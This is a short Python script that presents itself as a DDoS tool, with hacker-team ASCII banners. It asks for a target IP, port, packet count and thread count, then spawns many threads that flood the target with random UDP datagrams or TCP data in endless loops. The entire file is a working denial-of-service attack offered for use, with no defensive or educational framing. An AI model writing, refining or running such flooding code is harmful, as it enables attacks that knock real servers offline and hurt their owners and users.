import random
import socket
import threading
import platform

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 TEAM X is Presenting to you :


████████╗███████╗░█████╗░███╗░░░███╗  ██╗░░██╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║  ╚██╗██╔╝
░░░██║░░░█████╗░░███████║██╔████╔██║  ░╚███╔╝░
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  ░██╔██╗░
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  ██╔╝╚██╗
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

Created by MIDOU AND MANITA AND ZINOU
 _____                    _____       _
 / ____|                  |  __ \     | |
| |     _ __ __ ___  _____| |__) |__ _| |_
| |    | '__/ _` \ \/ / __|  _  // _` | __|
| |____| | | (_| |>  <\__ \ | \ \ (_| | |_
 \_____|_|  \__,_/_/\_\___/_|  \_\__,_|\__|

	""")
else :
	print("""\u001b[33m
 TEAM MRX is Presenting to you :
 _____                    _____       _
 / ____|                  |  __ \     | |
| |     _ __ __ ___  _____| |__) |__ _| |_
| |    | '__/ _` \ \/ / __|  _  // _` | __|
| |____| | | (_| |>  <\__ \ | \ \ (_| | |_
 \_____|_|  \__,_/_/\_\___/_|  \_\__,_|\__|

		""")


print("DDos")
ip= str(input("                    Server ip nik :"))
port= int(input("                    port nik :"))
choice = str(input("                    DDoS Attack?? (y/n)  :"))
times= int(input("                    Paket 80000 :"))
threads= int(input("                    threads 80000  :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM craxsrat TNIK!!!!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM craxsrat TNIK!!!!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
